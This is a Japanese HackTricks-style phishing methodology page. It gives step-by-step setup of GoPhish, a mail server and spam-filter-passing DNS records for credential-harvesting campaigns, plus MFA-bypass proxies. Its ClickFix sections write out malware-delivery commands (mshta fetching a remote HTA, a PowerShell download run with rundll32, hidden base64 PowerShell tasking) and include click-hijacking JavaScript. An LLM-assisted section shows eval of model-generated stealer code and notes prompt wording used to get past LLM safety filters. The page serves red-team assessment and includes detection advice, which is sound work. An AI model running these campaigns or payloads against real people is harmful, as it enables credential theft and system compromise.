# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を Recon する
1. **被害者のドメイン**を選択する。
2. 基本的な Web enumeration を実行し、被害者が使用している**ログインポータルを検索**して、どれを**偽装する**か**決定**する。
3. **OSINT**を使用して**メールアドレスを見つける**。
2. 環境を準備する
1. phishing assessment に使用する**ドメインを購入**する
2. メールサービスに関連するレコード（SPF、DMARC、DKIM、rDNS）を**設定**する
3. **gophish** を使用して VPS を設定する
3. campaign を準備する
1. **メールテンプレート**を準備する
2. 認証情報を盗むための**Web ページ**を準備する
4. campaign を開始する！

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: ドメイン名に元のドメインの重要な**キーワード**が**含まれる**（例: zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **hypened subdomain**: サブドメインの**ドットをハイフンに変更**する（例: www-zelster.com）。
- **New TLD**: **新しい TLD**を使用した同じドメイン（例: zelster.org）
- **Homoglyph**: ドメイン名内の文字を、**見た目が似ている文字**に**置き換える**（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の**2つの文字を入れ替える**（例: zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に「s」を追加または削除する（例: zeltsers.com）。
- **Omission**: ドメイン名から文字を1つ**削除する**（例: zelser.com）。
- **Repetition:** 文字を1つ**繰り返す**（例: zeltsser.com）。
- **Replacement**: Homoglyph に似ているが、より stealthy ではない。ドメイン名内の文字を1つ置き換える。元の文字に近いキーボード上の文字で置き換える場合もある（例: zektser.com）。
- **Subdomained**: ドメイン名の途中に**ドット**を挿入する（例: ze.lster.com）。
- **Insertion**: ドメイン名に文字を1つ**挿入する**（例: zerltser.com）。
- **Missing dot**: ドメイン名に TLD を付加する。（例: zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

さまざまな要因（solar flare、cosmic ray、ハードウェアエラーなど）により、保存中または通信中のビットの一部が**自動的に反転する可能性**がある。

この概念を**DNS request に適用**すると、**DNS server が受信するドメイン**が、最初に要求されたドメインと同じではなくなる可能性がある。

例えば、ドメイン「windows.com」の1ビットを変更すると、「windnws.com」に変わる可能性がある。

攻撃者は、被害者のドメインに似た**複数の bit-flipping domain を登録**することで、これを**悪用**できる。攻撃者の意図は、正規ユーザーを自分たちの infrastructure にリダイレクトすることである。

詳細については、[https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) を参照すること。<sup>[[10]](#references)[[11]](#references)</sup>

### Buy a trusted domain

[https://www.expireddomains.net/](https://www.expireddomains.net) で、使用できそうな expired domain を検索できる。\
購入しようとしている expired domain が**すでに良好な SEO を持っている**ことを確認するには、次のサイトでどのように分類されているかを検索できる。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

より多くの有効なメールアドレスを**発見**したり、すでに発見したものを**検証**したりするには、被害者の smtp server に対して brute-force できるか確認する。[ここでメールアドレスの検証/発見方法を学ぶ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーがメールにアクセスするために**Web portal を使用している場合**は、**username brute force** に対して脆弱かどうかを確認し、可能であればその脆弱性を exploit することも忘れてはならない。

## Configuring GoPhish

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) からダウンロードできる。

`/opt/gophish` 内にダウンロードして decompress し、`/opt/gophish/gophish` を実行する。\
出力に port 3333 の admin user 用 password が表示される。そのため、その port に access し、その credentials を使用して admin password を変更する必要がある。その port を local に tunnel する必要がある場合がある：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 設定

**TLS 証明書の設定**

この手順を開始する前に、使用する **ドメインをすでに購入済み**であり、**gophish** を設定する **VPS の IP** を **指すように設定**されている必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**メール設定**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します。

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、ファイル **`/etc/hostname`** と **`/etc/mailname`** をドメイン名に変更し、**VPSを再起動します。**

次に、`mail.<domain>` の **DNS Aレコード**を作成し、VPSの**IPアドレス**を指定します。また、`mail.<domain>` を指す **DNS MXレコード**を作成します。

それでは、メールの送信をテストしてみましょう:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophishの設定**

gophishの実行を停止して、設定しましょう。\
`/opt/gophish/config.json`を以下のように変更します（httpsの使用に注意してください）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service の設定**

gophish service を作成して自動的に起動し、service として管理できるようにするには、以下の内容でファイル `/etc/init.d/gophish` を作成します。
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
次の手順でサービスの設定を完了し、確認します:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### 待機して正当性を確保する

ドメインの登録期間が長いほど、spam として検出される可能性は低くなります。そのため、phishing assessment の前にできるだけ長く（少なくとも1週間）待機してください。さらに、reputational sector に関するページを設置すると、得られる reputation はより高くなります。

1週間待つ必要がある場合でも、設定作業は今すべて完了できます。

### Reverse DNS (rDNS) レコードの設定

VPS の IP アドレスをドメイン名に解決する rDNS (PTR) レコードを設定します。

### Sender Policy Framework (SPF) レコード

**新しいドメインに SPF レコードを設定する必要があります**。SPF レコードについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net) を使用して SPF policy を生成できます（VPS マシンの IP を使用してください）。

![phishing domain 用の SPF レコードを生成する SPF Wizard フォーム](<../../images/image (1037).png>)

これは、ドメイン内の TXT レコードに設定する必要がある内容です：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースのメッセージ認証、レポートおよび適合性（DMARC）レコード

**新しいドメイン用に DMARC レコードを設定する必要があります**。DMARC レコードについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指定し、以下の内容を設定した新しい DNS TXT record を作成する必要があります：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**新しいドメイン用に DKIM を設定する必要があります**。DMARC record について知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは以下をベースにしています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM key が生成する両方の B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定のスコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使用してテストできます\
ページにアクセスし、提供されたアドレスにメールを送信するだけです:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
`check-auth@verifier.port25.com` にメールを送信して**応答を読み取る**ことで、**メール設定を確認する**こともできます（この場合、**25**番ポートを**開放**し、root としてメールを送信した場合はファイル _/var/mail/root_ 内の応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
**自分が管理する Gmail にメッセージを送信**し、Gmail の受信トレイで**メールのヘッダー**を確認することもできます。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が存在するはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist からの削除

[www.mail-tester.com](https://www.mail-tester.com) では、あなたのドメインが spamhouse によってブロックされているか確認できます。ドメイン/IP の削除は、次のページからリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist からの削除

​​ドメイン/IP の削除は、[https://sender.office.com/](https://sender.office.com) からリクエストできます。

## GoPhish Campaign の作成と起動

### Sending Profile

- 送信者 profile を識別するための **name** を設定します
- phishing emails の送信に使用する account を決めます。候補: _noreply、support、servicedesk、salesforce..._
- username と password は空欄のままにできますが、Ignore Certificate Errors に必ずチェックを入れてください

![GoPhish Campaign の作成と起動 - Sending Profile: username と password は空欄のままにできますが、Ignore Certificate Errors に必ずチェックを入れてください](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作していることを確認するため、**Send Test Email** 機能を使用することを推奨します。\
> テストによって blacklist に登録されるのを避けるため、テスト emails は **10min mails addresses** に送信することを推奨します。

### Email Template

- template を識別するための **name** を設定します
- 次に **subject** を記述します（奇妙なものではなく、通常の email で読むことが想定される内容にします）
- "**Add Tracking Image**" にチェックが入っていることを確認します
- **email template** を記述します（次の例のように variables を使用できます）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
**メールの信頼性を高めるために**、クライアントからのメールに含まれる署名を使用することが推奨されます。提案：

- **存在しないアドレス**にメールを送信し、返信に署名が含まれているか確認する。
- info@ex.com、press@ex.com、public@ex.com のような**公開メールアドレス**を探し、メールを送信して返信を待つ。
- **発見した有効な**メールアドレスに連絡し、返信を待つ。

![送信プロファイル - メールテンプレート: 発見した有効なメールアドレスに連絡し、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> Email Template では、**送信するファイルを添付**することもできます。特殊に細工したファイルやドキュメントを使用して NTLM challenge も窃取したい場合は、[このページを参照してください](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- **名前**を入力する。
- Web ページの **HTML code** を**記述**する。Web ページを**import**することもできます。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる。
- **redirection** を設定する。

![メールテンプレート - Landing Page: Capture Submitted Data と Capture Passwords にチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページの HTML code を変更し、ローカル環境（Apache server などを使用できます）で、**結果に納得するまで**テストする必要があります。その後、その HTML code をボックスに記述します。\
> HTML に**静的リソース**（CSS や JS ページなど）を**使用する必要がある場合**は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> redirection では、**ユーザーを被害者の正規のメイン Web ページに redirect**したり、例として _/static/migration.html_ に redirect したりできます。さらに、**5 秒間 [**https://loading.io/**](https://loading.io) の**spinning wheel (**を表示し、その後プロセスが成功したことを示す**こともできます**。

### Users & Groups

- 名前を設定する。
- **データを Import**する（例の template を使用するには、各ユーザーの firstname、last name、email address が必要です）。

![Landing Page - Users & Groups: データを Import する（例の template を使用するには、各ユーザーの firstname、last name、email address が必要です）](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、group を選択して campaign を作成します。URL は被害者に送信されるリンクになります。

**Sending Profile では、最終的な phishing email がどのように見えるかを確認するため、test email を送信できます**。

![Users & Groups - Campaign: Sending Profile では、最終的な phishing email がどのように見えるかを確認するため、test email を送信できます](<../../images/image (192).png>)

すべての準備が整ったら、campaign を開始します。

## Website Cloning

何らかの理由で Web サイトを clone したい場合は、次のページを確認してください。


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部の phishing assessment（主に Red Team 向け）では、**何らかの backdoor を含むファイル**（C2 や、認証を trigger するだけのものなど）も**送信したい**場合があります。\
いくつかの例については、次のページを確認してください。


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の attack は、実際の Web サイトを偽装し、ユーザーが入力した情報を収集するため、非常に巧妙です。しかし、ユーザーが正しい password を入力しなかった場合や、偽装した application が 2FA で設定されている場合、**この情報だけでは騙されたユーザーになりすますことはできません**。

ここで [**evilginx2**](https://github.com/kgretzky/evilginx2)**、** [**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena) のような tools が役立ちます。これらの tool を使用すると、MitM に似た attack を生成できます。基本的に、attack は次のように動作します。

1. 実際の Web ページの login form に**なりすます**。
2. ユーザーが**credentials**を fake page に**送信**すると、tool はそれらを実際の Web ページに送信し、**credentials が機能するか確認**する。
3. account が **2FA** で設定されている場合、MitM page は 2FA を要求し、**ユーザーが入力すると**、tool はそれを実際の Web ページに送信する。
4. ユーザーが認証されると、tool が MitM を実行している間のすべての interaction について、攻撃者は**credentials、2FA、cookie、その他の情報を capture**できる。

### Via VNC

元の Web サイトと同じ外観の**悪意あるページに被害者を誘導する**代わりに、**実際の Web ページに接続された browser を備えた VNC session**に誘導したらどうでしょうか。ユーザーの操作を確認し、password、使用された MFA、cookie などを窃取できます。\
これは [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) で実行できます。<sup>[[3]](#references)[[4]](#references)</sup>

## 検知されていることの検知

当然ながら、bust されたかどうかを知る最良の方法の 1 つは、**自分の domain を blacklist 内で検索すること**です。掲載されている場合、何らかの方法で自分の domain が疑わしいものとして検知されています。\
自分の domain が blacklist に掲載されているか確認する簡単な方法は、[https://malwareworld.com/](https://malwareworld.com) を使用することです。

ただし、被害者が**実際に phishing activity を探しているかどうか**を知る方法は他にもあります。次のページで説明されています。


{{#ref}}
detecting-phising.md
{{#endref}}

被害者の domain と**非常によく似た名前の domain を購入**したり、自分が管理する domain の**subdomain** に被害者の domain の **keyword** を**含む certificate を生成**したりできます。**被害者**がそれらに対して何らかの **DNS または HTTP interaction** を実行すれば、**疑わしい domain を積極的に探している**ことが分かるため、非常に stealth に行動する必要があります。<sup>[[2]](#references)</sup>

### phishing の評価

[**Phishious** ](https://github.com/Rices/Phishious)を使用して、メールが spam folder に入るのか、block されるのか、または成功するのかを評価します。

## High-Touch Identity Compromise（Help-Desk MFA Reset）

現代の intrusion set は email lure を完全に省略し、**MFA を回避するために service-desk / identity-recovery workflow を直接標的にする**ことが増えています。この attack は完全な "living-off-the-land" です。operator が有効な credentials を取得すると、built-in admin tooling を使用して pivot します。malware は必要ありません。<sup>[[6]](#references)</sup>

### Attack flow
1. 被害者を Recon する
* LinkedIn、data breach、公開 GitHub などから個人情報および企業情報を収集する。
* high-value identity（executive、IT、finance）を特定し、password / MFA reset に関する**正確な help-desk process**を列挙する。
2. Real-time social engineering
* 被害者になりすまして、電話、Teams、または chat で help-desk に連絡する（多くの場合、**spoofed caller-ID** または **cloned voice** を使用）。
* 事前に収集した PII を提供し、knowledge-based verification を通過する。
* agent を説得して **MFA secret を reset**させるか、登録済み mobile number の **SIM-swap** を実行させる。
3. Immediate post-access actions（実際のケースでは 60 分以内）
* 任意の Web SSO portal を通じて foothold を確立する。
* built-in tool を使用して AD / AzureAD を列挙する（binary は drop しない）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 環境ですでに whitelist されている **WMI**、**PsExec**、または正規の **RMM** agent を使用して lateral movement を行う。

### Detection & Mitigation
* help-desk identity recovery を**privileged operation**として扱い、step-up auth と manager approval を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rule を導入し、次のイベントで alert を発生させる：
* MFA method の変更 + 新しい device / geo からの authentication。
* 同じ principal の即時 elevation（user-→-admin）。
* help-desk call を記録し、reset の前に**既に登録されている番号への call-back**を必須にする。
* **Just-In-Time (JIT) / Privileged Access**を実装し、reset 直後の account が high-privilege token を自動的に継承しないようにする。

---

## 大規模な Deception – SEO Poisoning と「ClickFix」Campaigns
Commodity crew は、**search engine と ad network を delivery channel に変える mass attack**によって、high-touch operation のコストを相殺します。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような fake result を search ad の上位に表示させる。
2. 被害者は小さな **first-stage loader**（多くの場合 JS/HTA/ISO）を download する。Unit 42 で確認された例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader は browser cookie と credential DB を exfiltrate し、その後、deploy する対象を *realtime* に判断する **silent loader** を取得する：
* RAT（例：AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* newly-registered domain を block し、e-mail だけでなく *search-ad* に対しても **Advanced DNS / URL Filtering** を適用する。
* software installation を signed MSI / Store package に限定し、policy により `HTA`、`ISO`、`VBS` の execution を deny する。
* browser が installer を開いた際の child process を monitor する：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader によって頻繁に abuse される LOLBins（例：`regsvr32`、`curl`、`mshta`）を hunt する。

### TDS handoff を伴う Download-button click hijacking
一部の fake software portal は、表示される download `href` を**実際の GitHub/release URL**にしたまま、JavaScript でユーザーの**最初の interaction**を hijack し、代わりに被害者を **Traffic Distribution System (TDS)** chain に送ります。<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
主な特徴:
- この hook は通常、`document` 上の **capture phase**（`true`）で実行されるため、サイト側の handler より先に発火する。
- Chrome では、リダイレクトを有効な **user gesture** に紐づけ、popup blocker の回避率を高めるために、`click` ではなく `mousedown` を使用することが多い。
- 一部の variant では、`about:blank` を先に開くか、`<a target="_blank">` の click を合成し、後から TDS URL を割り当てる。
- ブラウザ側の上限値は通常 `localStorage` に保存されるため、**最初の click** は malware に到達する一方、refresh/retry では無害に見える表示リンクへフォールバックすることがある。
- TDS は referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter check、click context、session ごとの counter によって分岐できるため、analyst による replay の結果が非決定的になる。

Defender 向けのアイデア:
- **表示された** `href` と、click 時に生成される **実際の** navigation target を比較する。
- `window.open`、`about:blank`、または合成 anchor click の周辺で、`preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` handler を探す。
- 新規登録された software-download domain の複数が、同じ CloudFront/JS stage を読み込んでいる場合は、高信頼の SEO-poisoning/TDS パターンとして扱う。

### 偽の verification page + archive に見せかけた LOLBAS fetch による ClickFix
一部の TDS branch は、被害者に次のような信頼された Windows binary の実行を指示する偽の verification page（Cloudflare/IUAM style）で終了する:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
注:
- `mshta.exe` は、URL が `.7z` アーカイブを装っていても、レスポンスの**先頭にある HTA/VBScript**を実行します。後続のアーカイブデータは、完全なデコイである可能性があります。
- 後続ステージでは、ファイル形式についても偽装を続けることがよくあります（PowerShell に対する `.rtf`、Python に対する `.asar`、パディングされたバイナリを含む ZIP など）。その後、**手動 PE マッピング / メモリ内実行**へ切り替えます。
- これらのチェーンのいずれかに対応する場合は、最初の成功実行時点から**ネットワーク + メモリ**を保持してください。後のリプレイでは、無害なインストーラー/SFX パスしか表示されないか、ペイロード/キーのリリースが元の TDS セッションにバインドされているため失敗する可能性があります。

### ClickFix DLL delivery tradecraft (偽 CERT 更新)
* 誘導: 国の CERT 勧告をクローンしたページに、手順形式の「修正」指示を表示する **Update** ボタンを配置します。被害者には、DLL をダウンロードし、`rundll32` 経由で実行するバッチを実行するよう指示します。<sup>[[12]](#references)</sup>
* 観測された典型的なバッチチェーン:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` はペイロードを `%TEMP%` にドロップし、短いスリープでネットワークジッターを隠した後、`rundll32` がエクスポートされたエントリーポイント（`notepad`）を呼び出します。
* DLL はホストの識別情報をビーコン送信し、数分おきに C2 をポーリングします。リモートタスクは、**base64-encoded PowerShell** として送信され、ポリシーバイパス付きで非表示実行されます:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性が維持されます（サーバーは DLL を更新せずにタスクを切り替えられます）。また、コンソールウィンドウも隠されます。`-WindowStyle Hidden`、`FromBase64String`、`Invoke-Expression` を同時に使用する `rundll32.exe` の子プロセスとしての PowerShell を探索してください。
* 防御側は、`...page.php?tynor=<COMPUTER>sss<USER>` 形式の HTTP(S) コールバックと、DLL ロード後の 5 分間隔のポーリングを確認できます。

---

## AI-Enhanced Phishing Operations
攻撃者は現在、**LLM と voice-clone API** を連鎖させ、完全にパーソナライズされた誘導とリアルタイムの対話を実現しています。

| Layer | 脅威アクターによる利用例 |
|-------|-----------------------------|
|Automation|ランダム化した文面とトラッキングリンクを使用して、10 万件超のメール / SMS を生成・送信する。|
|Generative AI|公開情報の M&A やソーシャルメディア上の内輪ネタに言及する*一回限り*のメールを作成し、コールバック詐欺では CEO のディープフェイク音声を使用する。|
|Agentic AI|ドメインを自律的に登録し、オープンソースインテリジェンスをスクレイピングし、被害者がクリックしたものの認証情報を送信しなかった場合に、次のステージのメールを作成する。|

**防御:**
• 信頼できない自動化から送信されたメッセージを強調表示する**動的バナー**を追加する（ARC/DKIM の異常を利用）。
• 高リスクの電話依頼には、**音声生体認証チャレンジフレーズ**を導入する。
• Awareness プログラムで AI 生成の誘導を継続的にシミュレートする – 静的なテンプレートは時代遅れです。

認証情報フィッシングにおける agentic browsing abuse については、以下も参照してください:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

ローカル CLI ツールおよび MCP の AI agent abuse（secrets inventory と検出）については、以下も参照してください:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻撃者は無害に見える HTML を配布し、**trusted LLM API** に JavaScript の生成を要求してから、ブラウザー内で実行することで（例: `eval` または動的な `<script>`）、**stealer をランタイムで生成**できます。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** プロンプト内に exfil URL / Base64 文字列をエンコードし、文言を反復して safety filter を回避し、hallucination を減らす。
2. **Client-side API call:** ロード時に JS が公開 LLM（Gemini/DeepSeek など）または CDN proxy を呼び出します。静的 HTML に存在するのはプロンプト/API call のみです。
3. **Assemble & exec:** レスポンスを連結して実行します（アクセスごとに polymorphic）。
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードが lure をパーソナライズし（例: LogoKit token parsing）、creds を prompt-hidden endpoint に送信する。

**Evasion traits**
- Traffic は well-known LLM domains または reputable CDN proxies に到達し、backend へは WebSockets 経由となる場合もある。
- Static payload は存在せず、malicious JS は render 後にのみ存在する。
- Non-deterministic generations により、セッションごとに **unique stealers** が生成される。

**Detection ideas**
- JS を有効にした sandboxes を実行し、**LLM responses を source とする runtime `eval`/dynamic script creation** を検知する。
- LLM APIs への front-end POST の直後に、返された text に対する `eval`/`Function` が実行されていないか調査する。
- client traffic 内の未承認 LLM domains と、その後の credential POSTs を検知する。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
classic push-bombing に加えて、operators は help-desk call 中に単純に **new MFA registration を強制**し、ユーザーが既に所有している token を無効化する。その後の login prompt は、victim には正規のものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta のイベントを監視し、**`deleteMFA` + `addMFA`** が**同一 IP から数分以内**に発生していないか確認します。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された、または typosquatting された web ページから被害者のクリップボードへ悪意のあるコマンドをひそかにコピーし、ユーザーを誘導してそれを **Win + R**、**Win + X**、またはターミナルウィンドウ内に貼り付けさせることで、ダウンロードや添付ファイルなしに任意のコードを実行させることができます。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR を使った social engineering による WhatsApp デバイスリンクの hijack
* 誘導ページ（例：偽の省庁/CERT「channel」）に WhatsApp Web/Desktop の QR を表示し、被害者にスキャンするよう指示することで、攻撃者を**リンク済みデバイス**としてひそかに追加します。<sup>[[12]](#references)</sup>
* 攻撃者は直ちにチャットおよび連絡先を閲覧できるようになり、セッションが削除されるまでその状態が続きます。被害者には後から「新しいデバイスがリンクされました」という通知が表示される場合があります。defender は、信頼できない QR ページへのアクセス直後に発生した、想定外のデバイスリンクイベントを hunt できます。

### crawler/sandbox を回避する Mobile‑gated phishing
